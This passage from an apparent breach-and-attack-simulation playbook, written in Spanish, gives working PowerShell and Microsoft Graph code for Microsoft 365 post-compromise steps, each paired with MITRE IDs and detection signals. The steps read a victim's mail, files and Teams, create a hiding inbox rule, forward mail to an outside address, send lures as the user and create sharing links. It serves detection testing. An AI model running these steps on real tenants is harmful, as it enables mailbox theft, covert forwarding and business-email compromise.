$State = if ($env:STRIKE_STATE_DIR) { $env:STRIKE_STATE_DIR } else { Join-Path $env:TEMP "strike-entra-state" }
New-Item -ItemType Directory -Force -Path $State | Out-Null

$Result = Invoke-RestMethod -Method GET -Headers $Headers -Uri "https://graph.microsoft.com/v1.0/users/${STRIKE_VICTIM_USER_ID}/mailFolders?$top=50"
$Result | ConvertTo-Json -Depth 20 | Tee-Object -FilePath (Join-Path $State "m365-mail-folders.json")
```

**Resultado esperado:**

Carpetas visibles en el mailbox canary.

**Señales de detección:**

Microsoft Graph data access sobre Exchange/Contacts; mailbox owner, appId, IP y volumen.

### 29. Enumerar mensajes recientes del mailbox

**MITRE:** T1114.002

Consultar Microsoft Graph para enumerar mensajes recientes del mailbox.

```powershell
$ErrorActionPreference = "Stop"
if (-not $env:STRIKE_ACCESS_TOKEN) { throw "Falta STRIKE_ACCESS_TOKEN" }
$Headers = @{ Authorization = "Bearer $($env:STRIKE_ACCESS_TOKEN)"; "Content-Type" = "application/json" }
$State = if ($env:STRIKE_STATE_DIR) { $env:STRIKE_STATE_DIR } else { Join-Path $env:TEMP "strike-entra-state" }
New-Item -ItemType Directory -Force -Path $State | Out-Null

$Result = Invoke-RestMethod -Method GET -Headers $Headers -Uri "https://graph.microsoft.com/v1.0/users/${STRIKE_VICTIM_USER_ID}/messages?$top=25&$select=id,subject,receivedDateTime,from,hasAttachments"
$Result | ConvertTo-Json -Depth 20 | Tee-Object -FilePath (Join-Path $State "m365-messages.json")
```

**Resultado esperado:**

Mensajes recientes y metadatos del mailbox.

**Señales de detección:**

Microsoft Graph data access sobre Exchange/Contacts; mailbox owner, appId, IP y volumen.

### 30. Buscar mensajes por marcador canary

**MITRE:** T1114.002

Consultar Microsoft Graph para buscar mensajes por marcador canary.

```powershell
$ErrorActionPreference = "Stop"
if (-not $env:STRIKE_ACCESS_TOKEN) { throw "Falta STRIKE_ACCESS_TOKEN" }
$Headers = @{ Authorization = "Bearer $($env:STRIKE_ACCESS_TOKEN)"; "Content-Type" = "application/json" }
$State = if ($env:STRIKE_STATE_DIR) { $env:STRIKE_STATE_DIR } else { Join-Path $env:TEMP "strike-entra-state" }
New-Item -ItemType Directory -Force -Path $State | Out-Null

$Result = Invoke-RestMethod -Method GET -Headers $Headers -Uri "https://graph.microsoft.com/v1.0/users/${STRIKE_VICTIM_USER_ID}/messages?$search=%22STRIKE-BAS%22&$top=25"
$Result | ConvertTo-Json -Depth 20 | Tee-Object -FilePath (Join-Path $State "m365-search-mail.json")
```

**Resultado esperado:**

Mensajes que contienen el marcador STRIKE-BAS.

**Señales de detección:**

Microsoft Graph data access sobre Exchange/Contacts; mailbox owner, appId, IP y volumen.

### 31. Descargar adjunto canary

**MITRE:** T1114.002

Consultar Microsoft Graph para descargar adjunto canary.

```powershell
$ErrorActionPreference = "Stop"
if (-not $env:STRIKE_ACCESS_TOKEN) { throw "Falta STRIKE_ACCESS_TOKEN" }
$Headers = @{ Authorization = "Bearer $($env:STRIKE_ACCESS_TOKEN)"; "Content-Type" = "application/json" }
$State = if ($env:STRIKE_STATE_DIR) { $env:STRIKE_STATE_DIR } else { Join-Path $env:TEMP "strike-entra-state" }
New-Item -ItemType Directory -Force -Path $State | Out-Null

$Result = Invoke-RestMethod -Method GET -Headers $Headers -Uri "https://graph.microsoft.com/v1.0/users/${STRIKE_VICTIM_USER_ID}/messages/${STRIKE_MAIL_MESSAGE_ID}/attachments/${STRIKE_MAIL_ATTACHMENT_ID}"
$Result | ConvertTo-Json -Depth 20 | Tee-Object -FilePath (Join-Path $State "m365-mail-attachment.json")
```

**Resultado esperado:**

Adjunto canary obtenido vía Graph.

**Señales de detección:**

Microsoft Graph data access sobre Exchange/Contacts; mailbox owner, appId, IP y volumen.

### 32. Enumerar contactos del usuario canary

**MITRE:** T1087.004

Consultar Microsoft Graph para enumerar contactos del usuario canary.

```powershell
$ErrorActionPreference = "Stop"
if (-not $env:STRIKE_ACCESS_TOKEN) { throw "Falta STRIKE_ACCESS_TOKEN" }
$Headers = @{ Authorization = "Bearer $($env:STRIKE_ACCESS_TOKEN)"; "Content-Type" = "application/json" }
$State = if ($env:STRIKE_STATE_DIR) { $env:STRIKE_STATE_DIR } else { Join-Path $env:TEMP "strike-entra-state" }
New-Item -ItemType Directory -Force -Path $State | Out-Null

$Result = Invoke-RestMethod -Method GET -Headers $Headers -Uri "https://graph.microsoft.com/v1.0/users/${STRIKE_VICTIM_USER_ID}/contacts?$top=50"
$Result | ConvertTo-Json -Depth 20 | Tee-Object -FilePath (Join-Path $State "m365-contacts.json")
```

**Resultado esperado:**

Contactos visibles para la identidad.

**Señales de detección:**

Microsoft Graph data access sobre Exchange/Contacts; mailbox owner, appId, IP y volumen.

### 33. Crear regla de Inbox canary

**MITRE:** T1114.003

Crear una regla que mueva mensajes con marcador STRIKE-BAS a una carpeta canary.

```powershell
$ErrorActionPreference = "Stop"
if (-not $env:STRIKE_ACCESS_TOKEN) { throw "Falta STRIKE_ACCESS_TOKEN" }
$Headers = @{ Authorization = "Bearer $($env:STRIKE_ACCESS_TOKEN)"; "Content-Type" = "application/json" }
$State = if ($env:STRIKE_STATE_DIR) { $env:STRIKE_STATE_DIR } else { Join-Path $env:TEMP "strike-entra-state" }
New-Item -ItemType Directory -Force -Path $State | Out-Null

$Body = @{ displayName="STRIKE-BAS-Hide"; sequence=1; isEnabled=$true; conditions=@{ subjectContains=@("STRIKE-BAS") }; actions=@{ moveToFolder=$env:STRIKE_MAIL_FOLDER_ID; stopProcessingRules=$true } } | ConvertTo-Json -Depth 12
$Result = Invoke-RestMethod -Method POST -Headers $Headers -Uri "https://graph.microsoft.com/v1.0/users/${STRIKE_VICTIM_USER_ID}/mailFolders/inbox/messageRules" -Body $Body
$Result | ConvertTo-Json -Depth 20 | Tee-Object -FilePath (Join-Path $State "m365-inbox-rule.json")
```

**Resultado esperado:**

La regla BAS queda habilitada sobre Inbox.

**Señales de detección:**

Exchange mailbox audit / Unified Audit Log: New-InboxRule o Graph rule creation; regla, condición y acción.

### 34. Habilitar forwarding del mailbox canary

**MITRE:** T1114.003

Configurar temporalmente forwarding hacia una dirección controlada preservando el estado previo.

```powershell
$ErrorActionPreference="Stop"
$State=if($env:STRIKE_STATE_DIR){$env:STRIKE_STATE_DIR}else{Join-Path $env:TEMP "strike-entra-state"}
New-Item -ItemType Directory -Force -Path $State | Out-Null
Import-Module ExchangeOnlineManagement
Connect-ExchangeOnline -Organization $env:STRIKE_TENANT_ID -ShowBanner:$false
$Old=Get-Mailbox -Identity $env:STRIKE_VICTIM_UPN | Select-Object ForwardingAddress,ForwardingSmtpAddress,DeliverToMailboxAndForward
$Old | Export-Clixml (Join-Path $State "m365-forwarding-before.xml")
Set-Mailbox -Identity $env:STRIKE_VICTIM_UPN -ForwardingSmtpAddress $env:STRIKE_FORWARDING_ADDRESS -DeliverToMailboxAndForward $true
```

**Resultado esperado:**

El mailbox reenvía una copia hacia el receptor BAS.

**Señales de detección:**

Unified Audit Log: Set-Mailbox; forwarding SMTP address, actor y target.

### 35. Enviar correo canary como usuario comprometido

**MITRE:** T1534

Enviar un mensaje interno inequívocamente etiquetado hacia un destinatario BAS.

```powershell
$ErrorActionPreference = "Stop"
if (-not $env:STRIKE_ACCESS_TOKEN) { throw "Falta STRIKE_ACCESS_TOKEN" }
$Headers = @{ Authorization = "Bearer $($env:STRIKE_ACCESS_TOKEN)"; "Content-Type" = "application/json" }
$State = if ($env:STRIKE_STATE_DIR) { $env:STRIKE_STATE_DIR } else { Join-Path $env:TEMP "strike-entra-state" }
New-Item -ItemType Directory -Force -Path $State | Out-Null

$Body=@{ message=@{ subject="STRIKE-BAS internal lure"; body=@{contentType="Text";content="Synthetic BAS message - no action required"}; toRecipients=@(@{emailAddress=@{address=$env:STRIKE_DELEGATE_UPN}}) }; saveToSentItems=$true } | ConvertTo-Json -Depth 10
Invoke-RestMethod -Method POST -Headers $Headers -Uri "https://graph.microsoft.com/v1.0/users/$($env:STRIKE_VICTIM_USER_ID)/sendMail" -Body $Body
```

**Resultado esperado:**

El destinatario canary recibe un mensaje interno etiquetado.

**Señales de detección:**

Exchange message trace, mailbox audit y Graph sendMail; sender, recipient, appId e IP.

### 36. Crear borrador de correo canary

**MITRE:** T1534

Crear un borrador interno que representa preparación de phishing o BEC sin enviarlo.

```powershell
$ErrorActionPreference = "Stop"
if (-not $env:STRIKE_ACCESS_TOKEN) { throw "Falta STRIKE_ACCESS_TOKEN" }
$Headers = @{ Authorization = "Bearer $($env:STRIKE_ACCESS_TOKEN)"; "Content-Type" = "application/json" }
$State = if ($env:STRIKE_STATE_DIR) { $env:STRIKE_STATE_DIR } else { Join-Path $env:TEMP "strike-entra-state" }
New-Item -ItemType Directory -Force -Path $State | Out-Null

$Body = @{ subject="STRIKE-BAS draft"; body=@{contentType="Text";content="Synthetic draft for detection validation"}; toRecipients=@(@{emailAddress=@{address=$env:STRIKE_DELEGATE_UPN}}) } | ConvertTo-Json -Depth 12
$Result = Invoke-RestMethod -Method POST -Headers $Headers -Uri "https://graph.microsoft.com/v1.0/users/${STRIKE_VICTIM_USER_ID}/messages" -Body $Body
$Result | ConvertTo-Json -Depth 20 | Tee-Object -FilePath (Join-Path $State "m365-draft.json")
```

**Resultado esperado:**

Se crea un borrador controlado en el mailbox.

**Señales de detección:**

Mailbox audit / Graph create message; subject, appId y mailbox.

### 37. Buscar sitios SharePoint accesibles

**MITRE:** T1213.002

Acceder mediante Microsoft Graph al data plane de SharePoint/OneDrive: buscar sitios sharepoint accesibles.

```powershell
$ErrorActionPreference = "Stop"
if (-not $env:STRIKE_ACCESS_TOKEN) { throw "Falta STRIKE_ACCESS_TOKEN" }
$Headers = @{ Authorization = "Bearer $($env:STRIKE_ACCESS_TOKEN)"; "Content-Type" = "application/json" }
$State = if ($env:STRIKE_STATE_DIR) { $env:STRIKE_STATE_DIR } else { Join-Path $env:TEMP "strike-entra-state" }
New-Item -ItemType Directory -Force -Path $State | Out-Null

$Result = Invoke-RestMethod -Method GET -Headers $Headers -Uri "https://graph.microsoft.com/v1.0/sites?search=STRIKE-BAS"
$Result | ConvertTo-Json -Depth 20 | Tee-Object -FilePath (Join-Path $State "m365-sites.json")
```

**Resultado esperado:**

Sitios canary visibles.

**Señales de detección:**

SharePoint/OneDrive audit y Graph activity; user/app, site, drive, item, IP y volumen.

### 38. Enumerar document libraries

**MITRE:** T1213.002

Acceder mediante Microsoft Graph al data plane de SharePoint/OneDrive: enumerar document libraries.

```powershell
$ErrorActionPreference = "Stop"
if (-not $env:STRIKE_ACCESS_TOKEN) { throw "Falta STRIKE_ACCESS_TOKEN" }
$Headers = @{ Authorization = "Bearer $($env:STRIKE_ACCESS_TOKEN)"; "Content-Type" = "application/json" }
$State = if ($env:STRIKE_STATE_DIR) { $env:STRIKE_STATE_DIR } else { Join-Path $env:TEMP "strike-entra-state" }
New-Item -ItemType Directory -Force -Path $State | Out-Null

$Result = Invoke-RestMethod -Method GET -Headers $Headers -Uri "https://graph.microsoft.com/v1.0/sites/${STRIKE_SITE_ID}/drives"
$Result | ConvertTo-Json -Depth 20 | Tee-Object -FilePath (Join-Path $State "m365-drives.json")
```

**Resultado esperado:**

Drives/document libraries del sitio BAS.

**Señales de detección:**

SharePoint/OneDrive audit y Graph activity; user/app, site, drive, item, IP y volumen.

### 39. Enumerar archivos canary

**MITRE:** T1213.002

Acceder mediante Microsoft Graph al data plane de SharePoint/OneDrive: enumerar archivos canary.

```powershell
$ErrorActionPreference = "Stop"
if (-not $env:STRIKE_ACCESS_TOKEN) { throw "Falta STRIKE_ACCESS_TOKEN" }
$Headers = @{ Authorization = "Bearer $($env:STRIKE_ACCESS_TOKEN)"; "Content-Type" = "application/json" }
$State = if ($env:STRIKE_STATE_DIR) { $env:STRIKE_STATE_DIR } else { Join-Path $env:TEMP "strike-entra-state" }
New-Item -ItemType Directory -Force -Path $State | Out-Null

$Result = Invoke-RestMethod -Method GET -Headers $Headers -Uri "https://graph.microsoft.com/v1.0/drives/${STRIKE_DRIVE_ID}/root/children"
$Result | ConvertTo-Json -Depth 20 | Tee-Object -FilePath (Join-Path $State "m365-drive-items.json")
```

**Resultado esperado:**

Elementos visibles en el drive canary.

**Señales de detección:**

SharePoint/OneDrive audit y Graph activity; user/app, site, drive, item, IP y volumen.

### 40. Descargar archivo canary

**MITRE:** T1213.002

Acceder mediante Microsoft Graph al data plane de SharePoint/OneDrive: descargar archivo canary.

```powershell
$ErrorActionPreference = "Stop"
if (-not $env:STRIKE_ACCESS_TOKEN) { throw "Falta STRIKE_ACCESS_TOKEN" }
$Headers = @{ Authorization = "Bearer $($env:STRIKE_ACCESS_TOKEN)"; "Content-Type" = "application/json" }
$State = if ($env:STRIKE_STATE_DIR) { $env:STRIKE_STATE_DIR } else { Join-Path $env:TEMP "strike-entra-state" }
New-Item -ItemType Directory -Force -Path $State | Out-Null

$Result = Invoke-RestMethod -Method GET -Headers $Headers -Uri "https://graph.microsoft.com/v1.0/drives/${STRIKE_DRIVE_ID}/items/${STRIKE_DRIVE_ITEM_ID}/content"
$Result | ConvertTo-Json -Depth 20 | Tee-Object -FilePath (Join-Path $State "m365-drive-download.bin")
```

**Resultado esperado:**

Contenido sintético descargado.

**Señales de detección:**

SharePoint/OneDrive audit y Graph activity; user/app, site, drive, item, IP y volumen.

### 41. Crear enlace de compartición sobre archivo canary

**MITRE:** T1567.002

Crear un enlace de visualización de alcance organization sobre un archivo sintético.

```powershell
$ErrorActionPreference = "Stop"
if (-not $env:STRIKE_ACCESS_TOKEN) { throw "Falta STRIKE_ACCESS_TOKEN" }
$Headers = @{ Authorization = "Bearer $($env:STRIKE_ACCESS_TOKEN)"; "Content-Type" = "application/json" }
$State = if ($env:STRIKE_STATE_DIR) { $env:STRIKE_STATE_DIR } else { Join-Path $env:TEMP "strike-entra-state" }
New-Item -ItemType Directory -Force -Path $State | Out-Null

$Body = @{ type="view"; scope="organization"; retainInheritedPermissions=$true } | ConvertTo-Json -Depth 12
$Result = Invoke-RestMethod -Method POST -Headers $Headers -Uri "https://graph.microsoft.com/v1.0/drives/${STRIKE_DRIVE_ID}/items/${STRIKE_DRIVE_ITEM_ID}/createLink" -Body $Body
$Result | ConvertTo-Json -Depth 20 | Tee-Object -FilePath (Join-Path $State "m365-share-link.json")
```

**Resultado esperado:**

Se genera un permiso/enlace organization sobre el archivo BAS.

**Señales de detección:**

SharePoint audit: Created sharing link; user/app, item, scope y recipients.

### 42. Subir archivo modificado a OneDrive/SharePoint

**MITRE:** T1565.001

Crear un archivo sintético modificado para validar integridad, versionado y detección.

```powershell
$ErrorActionPreference = "Stop"
if (-not $env:STRIKE_ACCESS_TOKEN) { throw "Falta STRIKE_ACCESS_TOKEN" }
$Headers = @{ Authorization = "Bearer $($env:STRIKE_ACCESS_TOKEN)"; "Content-Type" = "application/json" }
$State = if ($env:STRIKE_STATE_DIR) { $env:STRIKE_STATE_DIR } else { Join-Path $env:TEMP "strike-entra-state" }
New-Item -ItemType Directory -Force -Path $State | Out-Null

$Content=[Text.Encoding]::UTF8.GetBytes("STRIKE-BAS modified file $(Get-Date -Format o)")
$Result=Invoke-RestMethod -Method PUT -Headers @{Authorization="Bearer $($env:STRIKE_ACCESS_TOKEN)";"Content-Type"="text/plain"} -Uri "https://graph.microsoft.com/v1.0/drives/$($env:STRIKE_DRIVE_ID)/root:/STRIKE-BAS-modified.txt:/content" -Body $Content
$Result | ConvertTo-Json -Depth 10 | Set-Content (Join-Path $State "m365-modified-file.json")
```

**Resultado esperado:**

Se crea una nueva versión/archivo sintético con nombre STRIKE-BAS.

**Señales de detección:**

SharePoint audit: FileUploaded/FileModified; actor, item, site, IP y application.

### 43. Enumerar Teams del usuario canary

**MITRE:** T1213.005

Consultar mediante Graph el data plane de Teams: enumerar teams del usuario canary.

```powershell
$ErrorActionPreference = "Stop"
if (-not $env:STRIKE_ACCESS_TOKEN) { throw "Falta STRIKE_ACCESS_TOKEN" }
$Headers = @{ Authorization = "Bearer $($env:STRIKE_ACCESS_TOKEN)"; "Content-Type" = "application/json" }
$State = if ($env:STRIKE_STATE_DIR) { $env:STRIKE_STATE_DIR } else { Join-Path $env:TEMP "strike-entra-state" }
New-Item -ItemType Directory -Force -Path $State | Out-Null

$Result = Invoke-RestMethod -Method GET -Headers $Headers -Uri "https://graph.microsoft.com/v1.0/users/${STRIKE_VICTIM_USER_ID}/joinedTeams"
$Result | ConvertTo-Json -Depth 20 | Tee-Object -FilePath (Join-Path $State "m365-teams.json")
```

**Resultado esperado:**

Equipos a los que pertenece el usuario.

**Señales de detección:**

Microsoft Purview/Teams audit y Graph activity; team, channel, user/app e IP.

### 44. Enumerar canales del Team BAS

**MITRE:** T1213.005

Consultar mediante Graph el data plane de Teams: enumerar canales del team bas.

```powershell
$ErrorActionPreference = "Stop"
if (-not $env:STRIKE_ACCESS_TOKEN) { throw "Falta STRIKE_ACCESS_TOKEN" }
$Headers = @{ Authorization = "Bearer $($env:STRIKE_ACCESS_TOKEN)"; "Content-Type" = "application/json" }
$State = if ($env:STRIKE_STATE_DIR) { $env:STRIKE_STATE_DIR } else { Join-Path $env:TEMP "strike-entra-state" }
New-Item -ItemType Directory -Force -Path $State | Out-Null

$Result = Invoke-RestMethod -Method GET -Headers $Headers -Uri "https://graph.microsoft.com/v1.0/teams/${STRIKE_TEAM_ID}/channels"
$Result | ConvertTo-Json -Depth 20 | Tee-Object -FilePath (Join-Path $State "m365-channels.json")
```

**Resultado esperado:**

Canales del Team canary.

**Señales de detección:**

Microsoft Purview/Teams audit y Graph activity; team, channel, user/app e IP.

### 45. Leer mensajes de canal BAS

**MITRE:** T1213.005

Consultar mediante Graph el data plane de Teams: leer mensajes de canal bas.

```powershell
$ErrorActionPreference = "Stop"
if (-not $env:STRIKE_ACCESS_TOKEN) { throw "Falta STRIKE_ACCESS_TOKEN" }
$Headers = @{ Authorization = "Bearer $($env:STRIKE_ACCESS_TOKEN)"; "Content-Type" = "application/json" }
$State = if ($env:STRIKE_STATE_DIR) { $env:STRIKE_STATE_DIR } else { Join-Path $env:TEMP "strike-entra-state" }
New-Item -ItemType Directory -Force -Path $State | Out-Null

$Result = Invoke-RestMethod -Method GET -Headers $Headers -Uri "https://graph.microsoft.com/v1.0/teams/${STRIKE_TEAM_ID}/channels/${STRIKE_CHANNEL_ID}/messages?$top=25"
$Result | ConvertTo-Json -Depth 20 | Tee-Object -FilePath (Join-Path $State "m365-channel-messages.json")
```

**Resultado esperado:**

Mensajes del canal canary.

**Señales de detección:**

Microsoft Purview/Teams audit y Graph activity; team, channel, user/app e IP.

### 46. Publicar mensaje canary en Teams

**MITRE:** T1534

Publicar un mensaje interno etiquetado en un canal BAS para validar abuso de identidad.

```powershell
$ErrorActionPreference = "Stop"
if (-not $env:STRIKE_ACCESS_TOKEN) { throw "Falta STRIKE_ACCESS_TOKEN" }
$Headers = @{ Authorization = "Bearer $($env:STRIKE_ACCESS_TOKEN)"; "Content-Type" = "application/json" }
$State = if ($env:STRIKE_STATE_DIR) { $env:STRIKE_STATE_DIR } else { Join-Path $env:TEMP "strike-entra-state" }
New-Item -ItemType Directory -Force -Path $State | Out-Null

$Body = @{ body=@{ contentType="html"; content="<p>STRIKE-BAS synthetic internal lure - no action required</p>" } } | ConvertTo-Json -Depth 12
$Result = Invoke-RestMethod -Method POST -Headers $Headers -Uri "https://graph.microsoft.com/v1.0/teams/${STRIKE_TEAM_ID}/channels/${STRIKE_CHANNEL_ID}/messages" -Body $Body
$Result | ConvertTo-Json -Depth 20 | Tee-Object -FilePath (Join-Path $State "m365-team-message.json")
```

**Resultado esperado:**

El mensaje aparece en el canal autorizado.

**Señales de detección:**

Teams audit y Graph activity: message posted; sender/app, team, channel e IP.

### 47. Revocar sesiones del usuario canary

**MITRE:** T1531

Revocar refresh tokens y sesiones de inicio de sesión del usuario BAS para validar contención.

```powershell
$ErrorActionPreference = "Stop"
if (-not $env:STRIKE_ACCESS_TOKEN) { throw "Falta STRIKE_ACCESS_TOKEN" }
$Headers = @{ Authorization = "Bearer $($env:STRIKE_ACCESS_TOKEN)"; "Content-Type" = "application/json" }
$State = if ($env:STRIKE_STATE_DIR) { $env:STRIKE_STATE_DIR } else { Join-Path $env:TEMP "strike-entra-state" }
New-Item -ItemType Directory -Force -Path $State | Out-Null

$Body = @{} | ConvertTo-Json -Depth 12
$Result = Invoke-RestMethod -Method POST -Headers $Headers -Uri "https://graph.microsoft.com/v1.0/users/${STRIKE_VICTIM_USER_ID}/revokeSignInSessions" -Body $Body
$Result | ConvertTo-Json -Depth 20 | Tee-Object -FilePath (Join-Path $State "entra-revoke-sessions.json")
```

**Resultado esperado:**

Graph confirma que se actualizó signInSessionsValidFromDateTime.

**Señales de detección:**

Entra audit: Revoke all refresh tokens / sessions; actor, target user y timestamp.

### 48. Buscar evidencias en Unified Audit Log

**MITRE:** T1526

Consultar el Unified Audit Log para validar que las acciones BAS dejaron evidencia central.

```powershell
$ErrorActionPreference="Stop"
Import-Module ExchangeOnlineManagement
Connect-ExchangeOnline -Organization $env:STRIKE_TENANT_ID -ShowBanner:$false
$Start=(Get-Date).ToUniversalTime().AddHours(-4)
$End=(Get-Date).ToUniversalTime().AddMinutes(5)
Search-UnifiedAuditLog -StartDate $Start -EndDate $End -ResultSize 5000 |
  Where-Object { $_.AuditData -match "STRIKE-BAS|$([regex]::Escape($env:STRIKE_VICTIM_UPN))" } |
  Select-Object CreationDate,UserIds,Operations,AuditData | ConvertTo-Json -Depth 10
```

**Resultado esperado:**

Se recuperan eventos relevantes de Exchange, SharePoint, Teams, Entra y aplicaciones cuando la auditoría está disponible.

**Señales de detección:**

Esta es la validación directa del plano de auditoría; latencia de ingestión y campos requeridos.

---
_Exportado desde STRIKE — `microsoft-entra-id-and-microsoft-365-identity-compromise`_
